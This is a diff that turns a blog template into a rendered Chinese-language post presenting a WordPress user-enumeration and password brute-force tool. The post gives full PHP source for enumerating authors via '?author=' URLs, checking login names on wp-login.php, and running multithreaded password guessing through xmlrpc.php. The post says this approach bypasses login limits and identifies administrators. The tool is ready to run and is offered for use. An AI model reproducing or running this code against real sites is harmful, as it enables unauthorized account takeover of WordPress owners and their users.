@@ -1,37 +1,1059 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-{% block page_class %}page-post-detail{% endblock %}
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="web破解 一般喜欢用 burpsuite 、hydra 通用性好　但 一大堆参数　使用是还需配置 破解wordpress 用wpscan 不得不说是很好用 功能多 而且经常更新　　但 不是每次跑wordpress 都开linux (ruby 各种蛋疼) 1: 使用非常简单 无需其它参数 shell&gt;php scan.php http:&#x2F;&#x2F;www.target.com 或者是你的电脑装了ph">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wordpress 用户枚举，爆破工具">
+<meta property="og:url" content="http://example.com/2017/11/28/wordpress-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%EF%BC%8C%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="web破解 一般喜欢用 burpsuite 、hydra 通用性好　但 一大堆参数　使用是还需配置 破解wordpress 用wpscan 不得不说是很好用 功能多 而且经常更新　　但 不是每次跑wordpress 都开linux (ruby 各种蛋疼) 1: 使用非常简单 无需其它参数 shell&gt;php scan.php http:&#x2F;&#x2F;www.target.com 或者是你的电脑装了ph">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2017-11-28T02:24:47.000Z">
+<meta property="article:modified_time" content="2020-10-11T03:53:14.330Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wordpress,安全,用户,工具">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2017/11/28/wordpress-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%EF%BC%8C%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/">
 
 
-{% block content %}
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+  <title>wordpress 用户枚举，爆破工具 | Hexo</title>
+  
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/11/28/wordpress-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%EF%BC%8C%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          wordpress 用户枚举，爆破工具
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-28 10:24:47" itemprop="dateCreated datePublished" datetime="2017-11-28T10:24:47+08:00">2017-11-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-11 11:53:14" itemprop="dateModified" datetime="2020-10-11T11:53:14+08:00">2020-10-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>web破解 一般喜欢用 burpsuite 、hydra 通用性好　但 一大堆参数　使用是还需配置</p>
+<p>破解wordpress 用wpscan 不得不说是很好用 功能多 而且经常更新　　但 不是每次跑wordpress 都开linux (ruby 各种蛋疼)</p>
+<p>1: 使用非常简单 无需其它参数</p>
+<pre><code>shell&gt;php scan.php http://www.target.com</code></pre>
+<p>或者是你的电脑装了php，并且配置了环境变量，就是可以在scan.php这个文件所在目录运行这段代码了。</p>
+<p>2：多线程（异步） 同时进行</p>
+<p>破完一个用户成功立即退出该任务 接着破另外一个用户</p>
+<p>3：自动生成用户名相关并加到字典头部</p>
+<p>大大的提高破解速度</p>
+<p>4：模块可单独使用</p>
+<p>5：枚举用户模块 能抓取大部分常规 wordpress站点用户</p>
+<p>检查枚举到的用户是否为登陆用户 如果不是则剔除 大大的提高破解效率</p>
+<p>6：该脚本 需curl 扩展支持</p>
+<p>7：利用wordpress 的xmlrpc.php 文件破解</p>
+<p>可绕过限制 并判断是否为管理员用户</p>
+<p>8、环境简单</p>
+<p>仅需 php.exe 、php5ts.dll 、curl.dll</p>
+<p>文件说明：</p>
+<pre><code>init.php 配置及功能函数
+enum_user.php 根据页面枚举用户
+chkuser.php 检测枚举到的用户是否为可登陆用户
+RollingCurl.php 多线程http请求类 （修改版）
+BruteWordPress.php 爆破类
+scan.php 主文件(要运行的文件)
+pass.list 高频率弱口令</code></pre>
+<p>init.php</p>
+<pre><code>&lt;?php
+function_exists(&#39;curl_init&#39;)? &#39;&#39; : die(&#39;cURL Must be installed for geturl function to work. Ask your host to enable it or uncomment extension=php_curl.dll in php.ini&#39;);
+ini_set(&#39;memory_limit&#39;, -1);
+date_default_timezone_set(&#39;PRC&#39;);
+define(&quot;wordlist&quot;,&#39;pass.list&#39;);
+define(&quot;max_user&quot;,10);// 最大列出用户数
+define(&quot;USERAGENT&quot;,&#39;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36&#39;);
+define(&quot;START_TIME&quot;, func_time());
+define(&quot;Thread&quot;,10); //设置线程
+define(&quot;TimeOut&quot;,5);//设置超时时间
+define(&quot;params&quot;,$argv[0]);
+define(&quot;target&quot;,$argv[1]);
+if(target)&#123;
+    $domain = trim(target);
+    define(&quot;domain&quot;,$domain);
+&#125;else&#123;
+
+    exit(&#39;php &#39;.params.&#39; http://192.168.0.108/wordpress/&#39;);
+&#125;
+
+require_once &#39;RollingCurl.php&#39;;
+
+function func_time() &#123;
+    list($microsec, $sec) = explode(&#39; &#39;, microtime());
+    return $microsec + $sec;
+&#125;
+
+
+/***
+*  计算执行时间
+*/
+function show_time()&#123;
+    echo str_repeat(&quot; &quot;, 50) . PHP_EOL . &#39;time: &#39; . round((func_time() - START_TIME), 4) . &#39; sec &#39; . PHP_EOL;
+&#125;
+?&gt;</code></pre>
+<p>enum_user.php</p>
+<pre><code>&lt;?php
+class EnumUser
+&#123;
+
+    private $rc;
+    private $names;
+    function __construct() &#123;
+        $this-&gt;nv = 0;
+        $this-&gt;rc = new RollingCurl();
+        $this-&gt;rc-&gt;callback = $this-&gt;create_request_callback($this-&gt;rc);
+        $this-&gt;rc-&gt;__set(&#39;window_size&#39;, Thread);
+        $this-&gt;rc-&gt;__set(&#39;time_out&#39;, TimeOut);
+    &#125;
+
+    function create_request_callback($rc) &#123;
+        return function ($response, $info, $request) use ($rc) &#123;
+            $pattern = &#39;/(author\/(.*)\/feed|&lt;body class=&quot;archive author author-([^\s]+))/&#39;;
+            if (preg_match($pattern, $response, $name)) &#123;
+                $c = count($name) - 1;
+                if (!empty($name[$c])) &#123;
+                    $this-&gt;names[] = $name[$c];
+                &#125; else &#123;
+
+                    $this-&gt;nv++;
+                &#125;
+            &#125;
+            if ($this-&gt;nv &gt;= 3) &#123;
+
+                $this-&gt;rc-&gt;cancelRequests();
+            &#125;
+        &#125;;
+    &#125;
+
+    function run() &#123;
+        global $a;
+        printf(&quot;[+] %s Enumerating usernames ...\r\n&quot;, date(&#39;h:i:s&#39;, time()));
+        for ($i = 1; $i &lt;= max_user; $i++) &#123;
+            $url = domain . &quot;/?author=&quot; . $i;
+            $request = new RollingCurlRequest($url);
+            $request-&gt;options = array(CURLOPT_USERAGENT =&gt; USERAGENT);
+            $this-&gt;rc-&gt;add($request);
+        &#125;
+        $this-&gt;rc-&gt;execute();
+
+        if (count($this-&gt;names) == 0) &#123;
+            exit(&#39;[-] Unable to find user!&#39;);
+        &#125;
+
+        echo &quot;[+] Find &quot; . count($this-&gt;names) . &#39; users&#39; . PHP_EOL;
+    &#125;
+
+    function result() &#123;
+
+        return $this-&gt;names;
+    &#125;
+&#125;
+?&gt;</code></pre>
+<p>chkuser.php</p>
+<pre><code>&lt;?php
+include &#39;init.php&#39;;
+class Chkuser
+&#123;
+
+    private $rc;
+    private $names;
+    function __construct() &#123;
+        $this-&gt;rc = new RollingCurl();
+        $this-&gt;rc-&gt;callback = $this-&gt;create_request_callback($this-&gt;rc);
+        $this-&gt;rc-&gt;__set(&#39;window_size&#39;, Thread);
+        $this-&gt;rc-&gt;__set(&#39;time_out&#39;, TimeOut);
+    &#125;
+
+    function create_request_callback($rc) &#123;
+        return function ($response, $info, $request) use ($rc) &#123;
+            if ($info[&#39;http_code&#39;] == 404 || $info[&#39;http_code&#39;] == 403 || $info[&#39;http_code&#39;] == 500) &#123;
+                echo &#39;[-] Access error!&#39; . PHP_EOL;
+                $this-&gt;rc-&gt;cancelRequests();
+            &#125;
+            preg_match(&#39;#log=(.+)&amp;pwd=#&#39;, $request-&gt;post_data, $out);
+            $user = $out[1];
+
+            if (stristr($response, &quot;&lt;strong&gt;&quot; . $user . &quot;&lt;/strong&gt;&quot;)) &#123;
+                $this-&gt;names[] = $user;
+            &#125;
+            if (stristr($response, &#39;Too many failed login attempts&#39;)) &#123;
+                $this-&gt;rc-&gt;cancelRequests();
+            &#125;
+        &#125;;
+    &#125;
+
+    function run() &#123;
+        include_once &#39;enum_user.php&#39;;
+        $collector = new EnumUser();
+        $collector-&gt;run();
+        $users = $collector-&gt;result();
+        printf(&quot;[+] %s Chkusers Loginname...\r\n&quot;, date(&#39;h:i:s&#39;, time()));
+        foreach ($users as $user) &#123;
+            $url = domain . &#39;/wp-login.php&#39;;
+            $post_data = &quot;log=&#123;$user&#125;&amp;pwd=UjP8XnFD4n3LzIjlax&quot;;
+            $request = new RollingCurlRequest($url, &#39;POST&#39;, $post_data);
+            $request-&gt;options = array(CURLOPT_USERAGENT =&gt; USERAGENT);
+            $this-&gt;rc-&gt;add($request);
+        &#125;
+        $this-&gt;rc-&gt;execute();
+        $counts = count($this-&gt;names);
+        if ($counts == 0) &#123;
+            echo &#39;[-] Warning Unable Check Loginuser!&#39; . PHP_EOL;
+            $this-&gt;names = $users;
+            $counts = count($this-&gt;names);
+        &#125;
+        echo &#39;login users:&#39; . PHP_EOL;
+        foreach ($this-&gt;names as $key =&gt; $u) &#123;
+
+            echo &quot;\t&quot; .iconv(&quot;UTF-8&quot;,&quot;GB18030//IGNORE&quot;,$u) . PHP_EOL;
+        &#125;
+        printf(&quot;[+] %s Finded %d loginnames ... \r\n&quot;, date(&#39;h:i:s&#39;, time()), $counts);
+    &#125;
+
+    function result() &#123;
+
+        return $this-&gt;names;
+    &#125;
+&#125;
+?&gt;</code></pre>
+<p>RollingCurl.php</p>
+<pre><code>&lt;?php
+
+/*
+Authored by Josh Fraser (www.joshfraser.com)
+Released under Apache License 2.0
+
+Maintained by Alexander Makarov, http://rmcreative.ru/
+
+$Id$
+*/
+
+/**
+ * Class that represent a single curl request
+ */
+class RollingCurlRequest
+&#123;
+    public $url = false;
+    public $method = &#39;GET&#39;;
+    public $post_data = null;
+    public $headers = null;
+    public $options = null;
+
+    /**
+     * @param string $url
+     * @param string $method
+     * @param  $post_data
+     * @param  $headers
+     * @param  $options
+     * @return void
+     */
+    function __construct($url, $method = &quot;GET&quot;, $post_data = null, $headers = null, $options = null) &#123;
+        $this-&gt;url = $url;
+        $this-&gt;method = $method;
+        $this-&gt;post_data = $post_data;
+        $this-&gt;headers = $headers;
+        $this-&gt;options = $options;
+    &#125;
+
+    /**
+     * @return void
+     */
+    public function __destruct() &#123;
+        unset($this-&gt;url, $this-&gt;method, $this-&gt;post_data, $this-&gt;headers, $this-&gt;options);
+    &#125;
+&#125;
+
+/**
+ * RollingCurl custom exception
+ */
+class RollingCurlException extends Exception
+&#123;
+&#125;
+
+/**
+ * Class that holds a rolling queue of curl requests.
+ *
+ * @throws RollingCurlException
+ */
+class RollingCurl
+&#123;
+
+    /**
+     * @var int
+     *
+     * Window size is the max number of simultaneous connections allowed.
+     *
+     * REMEMBER TO RESPECT THE SERVERS:
+     * Sending too many requests at one time can easily be perceived
+     * as a DOS attack. Increase this window_size if you are making requests
+     * to multiple servers or have permission from the receving server admins.
+     */
+    private $window_size = 5;
+
+    /**
+     * @var float
+     *
+     * Timeout is the timeout used for curl_multi_select.
+     */
+    private $timeout = 10;
+
+    /**
+     * @var string|array
+     *
+     * Callback function to be applied to each result.
+     */
+    public $callback;
+
+    public $master = null;
+
+    public $requestList = array();
+
+    /**
+     * @var array
+     *
+     * Set your base options that you want to be used with EVERY request.
+     */
+    protected $options = array(CURLOPT_SSL_VERIFYPEER =&gt; 0, CURLOPT_RETURNTRANSFER =&gt; 1, CURLOPT_CONNECTTIMEOUT =&gt; 30, CURLOPT_TIMEOUT =&gt; 30);
+
+    /**
+     * @var array
+     */
+    private $headers = array();
+
+    /**
+     * @var Request[]
+     *
+     * The request queue
+     */
+    private $requests = array();
+
+    /**
+     * @var RequestMap[]
+     *
+     * Maps handles to request indexes
+     */
+    private $requestMap = array();
+
+    /**
+     * @param  $callback
+     * Callback function to be applied to each result.
+     *
+     * Can be specified as &#39;my_callback_function&#39;
+     * or array($object, &#39;my_callback_method&#39;).
+     *
+     * Function should take three parameters: $response, $info, $request.
+     * $response is response body, $info is additional curl info.
+     * $request is the original request
+     *
+     * @return void
+     */
+    function __construct($callback = null) &#123;
+        $this-&gt;callback = $callback;
+    &#125;
+
+    /**
+     * @param string $name
+     * @return mixed
+     */
+    public function __get($name) &#123;
+        return (isset($this-&gt;&#123;$name&#125;)) ? $this-&gt;&#123;$name&#125; : null;
+    &#125;
+
+    /**
+     * @param string $name
+     * @param mixed $value
+     * @return bool
+     */
+    public function __set($name, $value) &#123;
+
+        // append the base options &amp; headers
+        if ($name == &quot;options&quot; || $name == &quot;headers&quot;) &#123;
+            $this-&gt;&#123;$name&#125; = $value + $this-&gt;&#123;$name&#125;;
+        &#125; else &#123;
+            $this-&gt;&#123;$name&#125; = $value;
+        &#125;
+        return true;
+    &#125;
+
+    /**
+     * Add a request to the request queue
+     *
+     * @param Request $request
+     * @return bool
+     */
+    public function add($request) &#123;
+        $this-&gt;requests[] = $request;
+        return true;
+    &#125;
+
+    public function cancelRequests($all = true) &#123;
+        $this-&gt;requests = array();
+        if ($all) &#123;
+            foreach ($this-&gt;requestList as $handler) &#123;
+                curl_multi_remove_handle($this-&gt;master, $handler);
+            &#125;
+        &#125;
+        return true;
+    &#125;
+
+    /**
+     * Create new Request and add it to the request queue
+     *
+     * @param string $url
+     * @param string $method
+     * @param  $post_data
+     * @param  $headers
+     * @param  $options
+     * @return bool
+     */
+    public function request($url, $method = &quot;GET&quot;, $post_data = null, $headers = null, $options = null) &#123;
+        $this-&gt;requests[] = new RollingCurlRequest($url, $method, $post_data, $headers, $options);
+        return true;
+    &#125;
+
+    /**
+     * Perform GET request
+     *
+     * @param string $url
+     * @param  $headers
+     * @param  $options
+     * @return bool
+     */
+    public function get($url, $headers = null, $options = null) &#123;
+        return $this-&gt;request($url, &quot;GET&quot;, null, $headers, $options);
+    &#125;
+
+    /**
+     * Perform POST request
+     *
+     * @param string $url
+     * @param  $post_data
+     * @param  $headers
+     * @param  $options
+     * @return bool
+     */
+    public function post($url, $post_data = null, $headers = null, $options = null) &#123;
+        return $this-&gt;request($url, &quot;POST&quot;, $post_data, $headers, $options);
+    &#125;
+
+    /**
+     * Execute processing
+     *
+     * @param int $window_size Max number of simultaneous connections
+     * @return string|bool
+     */
+    public function execute($window_size = null) &#123;
+
+        // rolling curl window must always be greater than 1
+        if (sizeof($this-&gt;requests) == 1) &#123;
+            return $this-&gt;single_curl();
+        &#125; else &#123;
+
+            // start the rolling curl. window_size is the max number of simultaneous connections
+            return $this-&gt;rolling_curl($window_size);
+        &#125;
+    &#125;
+
+    /**
+     * Performs a single curl request
+     *
+     * @access private
+     * @return string
+     */
+    private function single_curl() &#123;
+        $ch = curl_init();
+        $request = array_shift($this-&gt;requests);
+        $options = $this-&gt;get_options($request);
+        curl_setopt_array($ch, $options);
+        $output = curl_exec($ch);
+        $info = curl_getinfo($ch);
+
+        // it&#39;s not neccesary to set a callback for one-off requests
+        if ($this-&gt;callback) &#123;
+            $callback = $this-&gt;callback;
+            if (is_callable($this-&gt;callback)) &#123;
+                call_user_func($callback, $output, $info, $request);
+            &#125;
+        &#125; else return $output;
+        return true;
+    &#125;
+
+    /**
+     * Performs multiple curl requests
+     *
+     * @access private
+     * @throws RollingCurlException
+     * @param int $window_size Max number of simultaneous connections
+     * @return bool
+     */
+    private function rolling_curl($window_size = null) &#123;
+        if ($window_size) $this-&gt;window_size = $window_size;
+
+        // make sure the rolling window isn&#39;t greater than the # of urls
+        if (sizeof($this-&gt;requests) &lt; $this-&gt;window_size) $this-&gt;window_size = sizeof($this-&gt;requests);
+
+        if ($this-&gt;window_size &lt; 2) &#123;
+            throw new RollingCurlException(&quot;Window size must be greater than 1&quot;);
+        &#125;
+
+        $this-&gt;master = curl_multi_init();
+
+        // start the first batch of requests
+        for ($i = 0; $i &lt; $this-&gt;window_size; $i++) &#123;
+            $ch = curl_init();
+
+            $options = $this-&gt;get_options($this-&gt;requests[$i]);
+
+            curl_setopt_array($ch, $options);
+            curl_multi_add_handle($this-&gt;master, $ch);
+            array_push($this-&gt;requestList, $ch);
+
+            // Add to our request Maps
+            $key = (string)$ch;
+            $this-&gt;requestMap[$key] = $i;
+        &#125;
+
+        do &#123;
+            while (($execrun = curl_multi_exec($this-&gt;master, $running)) == CURLM_CALL_MULTI_PERFORM);
+            if ($execrun != CURLM_OK) break;
+
+            // a request was just completed -- find out which one
+            while ($done = curl_multi_info_read($this-&gt;master)) &#123;
+
+                // get the info and content returned on the request
+                $info = curl_getinfo($done[&#39;handle&#39;]);
+                $output = curl_multi_getcontent($done[&#39;handle&#39;]);
+
+                // send the return values to the callback function.
+                $callback = $this-&gt;callback;
+                if (is_callable($callback)) &#123;
+                    $key = (string)$done[&#39;handle&#39;];
+                    $request = $this-&gt;requests[$this-&gt;requestMap[$key]];
+                    unset($this-&gt;requestMap[$key]);
+                    call_user_func($callback, $output, $info, $request);
+                &#125;
+
+                // start a new request (it&#39;s important to do this before removing the old one)
+                if ($i &lt; sizeof($this-&gt;requests) &amp;&amp; isset($this-&gt;requests[$i]) &amp;&amp; $i &lt; count($this-&gt;requests)) &#123;
+                    $ch = curl_init();
+                    $options = $this-&gt;get_options($this-&gt;requests[$i]);
+                    curl_setopt_array($ch, $options);
+                    curl_multi_add_handle($this-&gt;master, $ch);
+                    array_push($this-&gt;requestList, $ch);
+
+                    // Add to our request Maps
+                    $key = (string)$ch;
+                    $this-&gt;requestMap[$key] = $i;
+                    $i++;
+                &#125;
+
+                // remove the curl handle that just completed
+                curl_multi_remove_handle($this-&gt;master, $done[&#39;handle&#39;]);
+            &#125;
+
+            // Block for data in / output; error handling is done by curl_multi_exec
+            if ($running) curl_multi_select($this-&gt;master, $this-&gt;timeout);
+        &#125;
+        while ($running);
+        curl_multi_close($this-&gt;master);
+        return true;
+    &#125;
+
+    /**
+     * Helper function to set up a new request by setting the appropriate options
+     *
+     * @access private
+     * @param Request $request
+     * @return array
+     */
+    private function get_options($request) &#123;
+
+        // options for this entire curl object
+        $options = $this-&gt;__get(&#39;options&#39;);
+        if (ini_get(&#39;safe_mode&#39;) == &#39;Off&#39; || !ini_get(&#39;safe_mode&#39;)) &#123;
+            $options[CURLOPT_FOLLOWLOCATION] = 1;
+            $options[CURLOPT_MAXREDIRS] = 5;
+        &#125;
+        $headers = $this-&gt;__get(&#39;headers&#39;);
+
+        // append custom options for this specific request
+        if ($request-&gt;options) &#123;
+            $options = $request-&gt;options + $options;
+        &#125;
+
+        // set the request URL
+        $options[CURLOPT_URL] = $request-&gt;url;
+
+        // posting data w/ this request?
+        if ($request-&gt;post_data) &#123;
+            $options[CURLOPT_POST] = 1;
+            $options[CURLOPT_POSTFIELDS] = $request-&gt;post_data;
+        &#125;
+        if ($headers) &#123;
+            $options[CURLOPT_HEADER] = 0;
+            $options[CURLOPT_HTTPHEADER] = $headers;
+        &#125;
+
+        return $options;
+    &#125;
+
+    /**
+     * @return void
+     */
+    public function __destruct() &#123;
+        unset($this-&gt;window_size, $this-&gt;callback, $this-&gt;options, $this-&gt;headers, $this-&gt;requests);
+    &#125;
+&#125;</code></pre>
+<p>BruteWordPress.php</p>
+<pre><code>&lt;?php
+include &#39;init.php&#39;;
+define(&quot;user&quot;, $argv[2]);
+class BruteWordPress
+&#123;
+    private $rc;
+    function __construct() &#123;
+        $this-&gt;rc = new RollingCurl();
+        $this-&gt;rc-&gt;callback = $this-&gt;create_request_callback($this-&gt;rc);
+        $this-&gt;rc-&gt;__set(&#39;window_size&#39;, Thread);
+        $this-&gt;rc-&gt;__set(&#39;time_out&#39;, TimeOut);
+    &#125;
+
+    function create_request_callback($rc) &#123;
+        return function ($response, $info, $request) use ($rc) &#123;
+            if ($info[&#39;http_code&#39;] == 404 || $info[&#39;http_code&#39;] == 403 || $info[&#39;http_code&#39;] == 500) &#123;
+                echo &#39;[-] Access error!&#39; . PHP_EOL;
+                $this-&gt;rc-&gt;cancelRequests();
+            &#125;
+
+            $p = $request-&gt;post_data;
+            preg_match_all(&#39;/&lt;param&gt;&lt;value&gt;([^\s]+?)&lt;\/value&gt;&lt;\/param&gt;/&#39;, $p, $m);
+            $user = $m[1][0];
+            $pass = $m[1][1];
+            if (!preg_match(&#39;/&lt;boolean&gt;(\d)&lt;\/boolean&gt;/&#39;, $response, $is_admin)) &#123;
+
+                //echo &#39;[*] Brote user &#39; . $user . &quot; ...&quot; . &quot;\r&quot;;
+
+
+            &#125; else &#123;
+
+                //print_r($is_admin).PHP_EOL;
+                if ($is_admin[1] == 1) &#123;
+                    echo &#39;[+] Bruteed~ -&gt; &#39; . iconv(&quot;UTF-8&quot;,&quot;GB18030//IGNORE&quot;,$user)  . &#39;:&#39; . $pass . &#39; [is admin]&#39; . PHP_EOL;
+                    $this-&gt;rc-&gt;cancelRequests();
+                &#125; else &#123;
+                    echo &#39;[+] Bruteed~ -&gt; &#39; . iconv(&quot;UTF-8&quot;,&quot;GB18030//IGNORE&quot;,$user)  . &#39;:&#39; . $pass . PHP_EOL;
+                    $this-&gt;rc-&gt;cancelRequests();
+                &#125;
+            &#125;
+        &#125;;
+    &#125;
+
+    function run() &#123;
+        $pass_file = preg_replace(&#39;/\s$/&#39;, &quot;&quot;, file(wordlist));
+        $user_pre = array(&#39;123&#39;, &#39;111&#39;, &#39;1&#39;, &#39;a&#39;, &#39;pass&#39;, &#39;!@#&#39;, &#39;password&#39;, &#39;abc&#39;, &#39;1961&#39;, &#39;1962&#39;, &#39;1963&#39;, &#39;1970&#39;, &#39;1988&#39;, &#39;1989&#39;, &#39;1990&#39;, &#39;1991&#39;, &#39;1992&#39;, &#39;1993&#39;, &#39;1994&#39;, &#39;1995&#39;, &#39;1996&#39;, &#39;1997&#39;, &#39;1998&#39;, &#39;1999&#39;, &#39;2001&#39;, &#39;2002&#39;, &#39;2003&#39;, &#39;2004&#39;, &#39;2006&#39;, &#39;2005&#39;, &#39;2007&#39;, &#39;2008&#39;, &#39;2009&#39;, &#39;2010&#39;, &#39;2011&#39;, &#39;2012&#39;, &#39;2013&#39;, &#39;2014&#39;, &#39;2015&#39;);
+        foreach ($user_pre as $pre) &#123;
+            $pre_u[] = user . $pre;
+        &#125;
+        $p = array_merge($pre_u, $pass_file);
+        $passwords = array_unique($p);
+        array_unshift($passwords, user);
+
+        foreach ($passwords as $pass) &#123;
+            $url = domain . &#39;/xmlrpc.php&#39;;
+            $post_data = sprintf(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;%s&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;%s&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&#39;, user, $pass);
+            $request = new RollingCurlRequest($url, &#39;POST&#39;, $post_data);
+            $request-&gt;options = array(CURLOPT_USERAGENT =&gt; USERAGENT);
+            $this-&gt;rc-&gt;add($request);
+        &#125;
+        $this-&gt;rc-&gt;execute();
+    &#125;
+&#125;
+
+$brute = new BruteWordPress();
+$brute-&gt;run();
+?&gt;</code></pre>
+<p>scan.php</p>
+<pre><code>&lt;?php
+include &#39;chkuser.php&#39;;
+
+$chk = new Chkuser();
+$chk-&gt;run();
+$user_arr = $chk-&gt;result();
+
+//print_r($user_arr);
+
+function broter($user) &#123;
+
+    system(&#39;php BruteWordPress.php &#39; . target . &#39; &#39; . $user);
+&#125;
+printf(&quot;[+] %s Broting...\r\n&quot;, date(&#39;h:i:s&#39;, time()));
+foreach ($user_arr as $user) &#123;
+    echo &#39;[*] Brute user &#39; . iconv(&quot;UTF-8&quot;,&quot;GB18030//IGNORE&quot;,$user). &quot; ...&quot; . str_repeat(&#39; &#39;, 60) . &quot;\r&quot;;
+    broter($user);
+&#125;
+show_time();
